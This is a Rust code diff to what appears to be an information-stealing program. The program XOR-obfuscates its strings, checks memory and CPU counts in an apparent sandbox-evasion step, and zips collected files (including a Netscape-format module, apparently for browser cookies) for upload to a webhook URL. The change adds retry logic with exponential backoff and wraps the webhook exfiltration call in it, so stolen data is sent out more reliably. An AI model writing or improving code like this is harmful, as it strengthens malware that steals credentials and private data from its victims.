@@ -8,11 +8,60 @@ mod netscape;
 pub mod sender;
 mod zip_layout;
 
-use std::path::PathBuf;
+use std::future::Future;
+use std::path::{Path, PathBuf};
+use std::time::Duration;
 
 const XOR_KEY: u8 = 0x5A;
 const MIN_MEMORY_BYTES: u64 = 4 * 1024 * 1024 * 1024;
 const MAX_CPU_CORES: usize = 2;
+const MAX_NETWORK_RETRIES: u32 = 3;
+const INITIAL_RETRY_DELAY_MS: u64 = 250;
+const FILE_RETRY_DELAY_MS: u64 = 100;
+
+/// Retries an async operation with exponential backoff (up to 3 attempts).
+pub(crate) async fn retry_async<F, Fut, T, E>(mut operation: F) -> Result<T, E>
+where
+    F: FnMut() -> Fut,
+    Fut: Future<Output = Result<T, E>>,
+{
+    let mut delay_ms = INITIAL_RETRY_DELAY_MS;
+    let mut last_error = None;
+
+    for attempt in 0..MAX_NETWORK_RETRIES {
+        match operation().await {
+            Ok(value) => return Ok(value),
+            Err(error) => {
+                last_error = Some(error);
+                if attempt + 1 < MAX_NETWORK_RETRIES {
+                    tokio::time::sleep(Duration::from_millis(delay_ms)).await;
+                    delay_ms = delay_ms.saturating_mul(2);
+                }
+            }
+        }
+    }
+
+    Err(last_error.expect("retry loop must retain last error"))
+}
+
+/// Reads a binary file, retrying once after a short delay on failure.
+pub(crate) fn read_bytes_with_retry(path: &Path) -> std::io::Result<Vec<u8>> {
+    match std::fs::read(path) {
+        Ok(content) => Ok(content),
+        Err(first_error) => {
+            std::thread::sleep(Duration::from_millis(FILE_RETRY_DELAY_MS));
+            std::fs::read(path).or(Err(first_error))
+        }
+    }
+}
+
+/// Reads a UTF-8 file, retrying once after a short delay on failure.
+pub(crate) fn read_to_string_with_retry(path: &Path) -> std::io::Result<String> {
+    read_bytes_with_retry(path).and_then(|bytes| {
+        String::from_utf8(bytes)
+            .map_err(|error| std::io::Error::new(std::io::ErrorKind::InvalidData, error))
+    })
+}
 
 pub(crate) fn xor_str(data: &[u8]) -> String {
     String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
@@ -224,7 +273,7 @@ pub async fn run(client: &reqwest::Client, webhook_url: &str) -> Result<(), Box<
     zip_layout::sort_entries(&mut all_files);
 
     if !all_files.is_empty() {
-        sender::send_zip(client, webhook_url, &all_files).await?;
+        retry_async(|| sender::send_zip(client, webhook_url, &all_files)).await?;
     }
 
     Ok(())
